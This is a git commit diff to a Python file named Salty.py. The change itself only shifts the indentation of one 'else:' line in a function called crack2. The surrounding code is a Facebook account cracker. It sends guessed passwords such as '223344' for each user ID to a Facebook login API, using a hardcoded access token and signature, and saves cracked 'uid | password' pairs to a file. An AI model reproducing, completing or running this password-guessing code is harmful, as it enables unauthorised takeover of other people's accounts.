2edc5974bd4b54e7f3cef850c1fb5795d8e0776a
Mr. NIKI <93582194+Niki404-Cyber@users.noreply.github.com>
2021-11-07 16:52:31 +0600

    Update Salty.py

--- Salty.py
+++ Salty.py
@@ -526,7 +526,7 @@ def crack2():
 		                                                                            ok.write(uid+" | "+pass9+"\n")
 		                                                                            ok.close()
 		                                                                            oks.append(uid)
-		                                                                       else:
+		                                                                        else:
 		                                                                           pass10="223344"
 		                                                                           q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                                           d=json.loads(q)
